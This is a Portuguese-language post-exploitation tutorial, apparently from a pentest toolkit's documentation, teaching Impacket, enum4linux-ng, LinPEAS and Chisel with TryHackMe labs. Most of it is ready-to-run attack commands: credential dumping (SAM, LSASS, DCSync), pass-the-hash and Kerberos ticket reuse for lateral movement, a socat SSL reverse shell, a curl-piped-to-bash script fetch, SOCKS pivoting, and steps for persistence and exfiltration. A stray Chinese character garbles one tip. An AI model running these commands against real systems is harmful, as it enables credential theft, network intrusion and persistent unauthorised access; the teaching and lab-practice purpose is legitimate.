# 🔧 Pós-Exploração

> Ferramentas para manter acesso e explorar sistemas após exploração inicial.

## 📚 O que é Pós-Exploração?

**Pós-exploração** é tudo que você faz **depois de ganhar acesso inicial**. É como entrar na casa — agora você precisa explorar os cômodos, encontrar o cofre, pegar as chaves de outras casas.

### Por que isso é importante?

- Acesso inicial pode ser **limitado** (usuário normal)
- Precisa **escalar para admin/root** para controle total
- Pode haver **outras máquinas** na rede (movimentação lateral)
- Objetivo final: **alcançar o alvo real** (que pode estar em outro lugar)

### O que você faz na pós-exploração?

```
Acesso inicial (reverse shell)
        ↓
1. Enumerar → O que tem nessa máquina?
        ↓
2. Escalar → Ganhar root/admin
        ↓
3. Movimentar → Acessar outras máquinas
        ↓
4. Persistir → Manter acesso mesmo se bloqueado
        ↓
5. Exfiltrar → Levar os dados (se for o objetivo)
```

### Ferramentas por sistema operacional

| Linux | Windows | Para que serve |
|:---|:---|:---|
| LinPEAS | WinPEAS | Enumeração automatizada |
| smbclient.py | psexec.py | Acesso via SMB |
| secretsdump.py | mimikatz | Dump de credenciais |
| socat | nc | Reverse shell |

### Conceitos importantes

| Conceito | Significado |
|:---|:---|
| **Escalation** | Ganhar mais privilégios (user → root) |
| **Lateral Movement** | Acessar outras máquinas na rede |
| **Pivoting** | Usar máquina comprometida como ponte |
| **Persistence** | Manter acesso após reiniciar |
| **Exfiltration** | Enviar dados para fora da rede |

---

## 🚀 Passo a Passo — Como fazer Pós-Exploração

Você já conseguiu acesso a uma máquina (ex: via reverse shell). Agora vamos **explorar mais** e pegar credenciais.

### Passo 1: Enumeração básica (smbclient.py)
```bash
# Primeiro, veja quais shares (pastas compartilhadas) a máquina tem
smbclient.py usuario:senha@192.168.1.1

# Se não tiver senha, tente anônimo:
smbclient.py usuario:senha@192.168.1.1 -shares
```

### Passo 2: Executar comandos (wmiexec.py)
```bash
# Execute comandos na máquina remota (mais stealth que psexec)
wmiexec.py usuario:senha@192.168.1.1

# Isso te dá um shell interativo — teste:
whoami
hostname
ipconfig
```

### Passo 3: Pegar hashes de senhas (secretsdump.py)
```bash
# Isso pega todos os hashes de senhas da máquina
secretsdump.py usuario:senha@192.168.1.1

# O output mostra hashes como:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:da76f...
# Salve esses hashes!
```

### Passo 4: Usar os hashes encontrados (Pass-the-Hash)
```bash
# Agora você pode usar os hashes para acessar OUTRAS máquinas
psexec.py outro_usuario@outra_maquina -hashes aad3b435b51404eeaad3b435b51404ee:da76f...

# Ou via WMI (mais stealth):
wmiexec.py outro_usuario@outra_maquina -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
```

### Passo 5: Transferir arquivos (smbserver.py)
```bash
# Crie um share SMB temporário para enviar/receber arquivos
smbserver.py share /tmp/pasta_compartilhada -smb2

# Na máquina alvo, acesse:
# \\192.168.1.1\share\arquivo.exe
```

### Resumo da ordem — Por que essa sequência?

Pós-exploração segue: **manter acesso → enumerar → movimentar**.

```
PASSO 1: Estabilizar shell → Garantir acesso persistente
├── POR QUE: Shells interrompidas são comuns, precisa de algo mais estável
├── O QUE FAZER: Usar socat para shell com SSL, ou meterpreter
├── COMANDO: socat OPENSSL:IP:4444,verify=0 EXEC:/bin/bash
├── QUANDO AVANÇAR: Quando tiver shell estável
└── DICAS: Teste com Ctrl+C se a shell trava

        ↓

PASSO 2: Enumerar sistema → Descobrir o que tem na máquina
├── POR QUE: Precisa saber: versão do SO, usuários, serviços, configurações
├── O QUE PROCURAR: Versão do kernel (vulnerável?), usuários com sudo, arquivos sensíveis
├── COMANDO: LinPEAS no Linux, WinPEAS no Windows
├── QUANDO AVANÇAR: Quando tiver mapa completo do sistema
└── ERROS COMUNS: Não pule a enumeração — ela revela caminhos de escalação

        ↓

PASSO 3: Escalação de privilégios → Ganhar root/admin
├── POR QUE: Root = acesso total ao sistema
├── O QUE PROCURAR: SUID binaries, kernels vulneráveis, sudo sem senha
├── FERRAMENTAS: LinPEAS, GTFOBins, linux-exploit-suggester
├── QUANDO AVANÇAR: Quando tiver root
└── SE DER ERRADO: Se não achar caminho, verifique /etc/crontab, /opt/, backups

        ↓

PASSO 4: Enumerar rede → Descobrir outras máquinas
├── POR QUE: Uma máquina comprometida pode dar acesso a outras
├── O QUE PROCURAR: Outros IPs na rede, serviços internos, trust relationships
├── COMANDO: ip a, arp -a, nmap -sn 10.0.0.0/24
├── QUANDO AVANÇAR: Quando souber quais máquinas existem na rede
└── DICAS: Verifique /etc/hosts, /etc/resolv.conf, rotas

        ↓

PASSO 5: Movimentação lateral → Acessar outras máquinas
├── POR QUE: O alvo final pode estar em outra máquina
├── O QUE FAZER: Usar credenciais encontradas, pivoting, pass-the-hash
├── FERRAMENTAS: Impacket (smbexec, wmiexec), Evil-WinRM
├── QUANDO PARAR: Quando alcançar o alvo final
└── ÉTICA: Documente cada passo para o relatório
```

---

## Impacket

Toolkit Python para protocolos de rede Windows/SMB/NetBIOS. Poderoso para movimentação lateral.

### Instalação
```bash
sudo apt install -y python3-impacket
```

### Ferramentas mais usadas

| Ferramenta | Descrição |
|:---|:---|
| `psexec.py` | Executar comandos via SMB (como PsExec do Sysinternals) |
| `wmiexec.py` | Executar comandos via WMI |
| `smbexec.py` | Executar comandos via SMB (sem upload de binary) |
| `atexec.py` | Executar comandos via Agenda de Tarefas |
| `secretsdump.py` | Dump de credenciais (SAM, LSASS, DCSync) |
| `smbclient.py` | Cliente SMB interativo |
| `smbserver.py` | Servidor SMB (para transferir arquivos) |
| `getTGT.py` | Obter TGT Kerberos |
| `getST.py` | Obter Service Ticket |
| `ticketConverter.py` | Converter tickets Kerberos |
| `mimidump.py` | Dump de memória do Mimikatz |

### Exemplos práticos

```bash
# === ACESSO SMB ===

# Listar shares
smbclient.py domain/user:password@192.168.1.1

# Listar shares anônimo
smbclient.py domain/user:password@192.168.1.1 -shares

# Conectar a share específica
smbclient.py domain/user:password@192.168.1.1 -share "C$"

# === EXECUÇÃO DE COMANDOS ===

# Via SMB (precisa de admin)
psexec.py domain/user:password@192.168.1.1

# Via WMI (mais stealth)
wmiexec.py domain/user:password@192.168.1.1

# Via SMB sem upload
smbexec.py domain/user:password@192.168.1.1

# Via agenda de tarefas
atexec.py domain/user:password@192.168.1.1 "whoami"

# === PASS-THE-HASH ===

# Usar hash NTLM no lugar de senha
psexec.py domain/user@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
wmiexec.py domain/user@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:da76f...

# === DUMP DE CREDENCIAIS ===

# Dump SAM ( hashes locais)
secretsdump.py domain/user:password@192.168.1.1

# Dump SAM via hash
secretsdump.py domain/user@192.168.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:da76f...

# DCSync (replicar AD)
secretsdump.py domain/user:password@192.168.1.1 -just-dc-ntlm

# Dump LSASS remoto
secretsdump.py domain/user:password@192.168.1.1 -lsass

# === KERBEROS ===

# Obter TGT com hash
getTGT.py domain/user -hashes aad3b435b51404eeaad3b435b51404ee:da76f...

# Obter TGT com senha
getTGT.py domain/user:password

# Obter Service Ticket (Kerberoasting)
getST.py -spn cifs/target.domain.local domain/user -hashes ...

# Converter ticket
ticketConverter.py ticket.kirbi ticket.ccache

# Usar ticket (Kerberos authentication)
export KRB5CCNAME=ticket.ccache
psexec.py domain/user@target.domain.local -k -no-pass

# === TRANSFERÊNCIA DE ARQUIVOS ===

# Criar share SMB temporário
smbserver.py share /tmp/share -smb2

# Na máquina alvo, conectar:
copy \\192.168.1.1\share\arquivo.exe C:\temp\

# OU em Linux:
smbclient.py domain/user:password@192.168.1.1 -share share -use-smb2
```

### Autenticação Kerberos

```bash
# Configurar Kerberos (no /etc/krb5.conf)
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

# Usar ticket com Impacket
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py target.domain.local -k -no-pass
```

---

## Enum4linux-ng

Enumeração SMB/Windows moderna. Descobre shares, usuários, polices, etc.

### Instalação
```bash
sudo git clone --depth=1 https://github.com/cddmp/enum4linux-ng.git /opt/enum4linux-ng
cd /opt/enum4linux-ng && sudo pip3 install -r requirements.txt
sudo ln -sf /opt/enum4linux-ng/enum4linux-ng.py /usr/local/bin/enum4linux-ng
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-U` | Listar usuários |
| `-S` | Listar shares |
| `-P` | Listar polices (password policy) |
| `-G` | Listar grupos |
| `-M` | Enumerar MAC |
| `-o` | Output JSON |
| `-A` | Enumeração completa |

### Exemplos práticos

```bash
# Enumeração completa
enum4linux-ng -A 192.168.1.1

# Listar shares
enum4linux-ng -S 192.168.1.1

# Listar usuários
enum4linux-ng -U 192.168.1.1

# Com autenticação
enum4linux-ng -u admin -p senha -A 192.168.1.1

# Output JSON
enum4linux-ng -A -o output.json 192.168.1.1

# Listar polices de senha
enum4linux-ng -P 192.168.1.1
```

### O que o enum4linux-ng descobre
- Shares SMB disponíveis
- Usuários do domínio
- Grupos e membros
- Polices de senha
- Informações do domínio
- Versão do SO
- Horário do sistema
- SMTP relay

### enum4linux-ng vs smbclient.py

| Feature | enum4linux-ng | smbclient.py |
|:---|:---|:---|
| Enumeração | ✅ Completa | Limitada |
| Interativo | ❌ | ✅ |
| Dump de dados | ❌ | ✅ |
| Speed | Rápido | Mais lento |
| Output | JSON | Terminal |

---

## Outras ferramentas de pós-exploração (não no install.sh)

### Linpeas / Winpeas
```bash
# Enumeração de privilege escalation
# Linux:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Windows:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o winPEAS.bat
```

### Chisel (Proxy reverso via HTTP)
```bash
# Instalar
go install github.com/jpillora/chisel@latest

# Atacante (server):
chisel server --reverse -p 8080

# Vítima (client):
chisel client 192.168.1.1:8080 R:socks
```

### Ligolo-ng (Tunneling)
```bash
# Alternativa ao Chisel para pivoting
# https://github.com/nicocha30/ligolo-ng
```

---

## Fluxo típico de Pós-Exploração

```
1. Acesso inicial obtido
        ↓
2. Enumeração interna (smbclient.py, wmiexec.py)
        ↓
3. Dump de credenciais (secretsdump.py)
        ↓
4. Movimentação lateral (psexec.py com novas credenciais)
        ↓
5. Escalada de privilégios (DUMP de admin, Kerberos)
        ↓
6. Persistência (scheduled tasks, registry, etc)
        ↓
7. Exfiltração de dados
```

### Resumo de comandos mais usados

```bash
# Listar shares
smbclient.py user:pass@IP

# Executar comandos
wmiexec.py user:pass@IP "whoami"

# Dump de hashes
secretsdump.py user:pass@IP

# Pass-the-hash
psexec.py user@IP -hashes LMHASH:NTHASH

# Kerberos
export KRB5CCNAME=ticket.ccache
psexec.py user@TARGET -k -no-pass
```

---

## Lab Prático

### Exercício 1: Pós-Exploração Linux
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/linprivesc
- **O que vai praticar:** Enumeração, escalação de privilégios, movimentação lateral em Linux
- **Tempo estimado:** 45 min

### Exercício 2: Pós-Exploração Windows
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/ice
- **O que vai praticar:** Pivoting, dump de credenciais, exploração de rede interna
- **Tempo estimado:** 60 min

### Dica de Estudo
> Sempre枚umerar antes de tentar escalar privilégios. Use LinPEAS/WinPEAS para automatizar.
